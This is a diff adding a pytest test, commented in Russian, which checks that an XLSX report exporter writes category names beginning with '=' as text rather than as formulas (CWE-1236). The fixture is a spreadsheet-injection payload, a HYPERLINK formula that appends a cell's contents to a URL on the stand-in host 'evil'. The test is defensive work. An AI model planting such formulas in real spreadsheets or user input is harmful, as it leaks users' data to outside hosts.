@@ -244,3 +244,45 @@ def test_export_money_columns_hold_numbers_not_text() -> None:
                     assert not isinstance(cell.value, str), (
                         f"текст вместо числа: {sheet.title}:{cell.coordinate}"
                     )
+
+
+def test_export_user_text_is_not_formula() -> None:
+    """Замечание Duo MR !28: категория с «=» пишется текстом, не формулой (CWE-1236)."""
+
+    injection = '=HYPERLINK("http://evil/?"&A2,"Продукты")'
+    report = ExportReportDTO(
+        date_from=date(2026, 10, 1),
+        date_to=date(2026, 10, 31),
+        income=Decimal("0.00"),
+        expense=Decimal("10.00"),
+        balance=Decimal("-10.00"),
+        operations=[
+            ExportOperationDTO(
+                occurred_on=date(2026, 10, 5),
+                category_name=injection,
+                kind="expense",
+                amount=Decimal("10.00"),
+            ),
+        ],
+        categories=[
+            SeriesPointDTO(
+                category_id=None,
+                category_name=injection,
+                amount=Decimal("10.00"),
+                share_percent=Decimal("100.00"),
+                limit=None,
+                limit_remaining=None,
+                limit_percent=None,
+                limit_exceeded=False,
+            ),
+        ],
+    )
+
+    workbook = load_workbook(BytesIO(XlsxReportExporter().export(report).content))
+
+    operation_name = workbook["Операции"].cell(row=2, column=2)
+    category_name = workbook["По категориям"].cell(row=2, column=1)
+
+    for cell in (operation_name, category_name):
+        assert cell.data_type == "s", f"строка записана формулой: {cell.coordinate}"
+        assert cell.value == injection
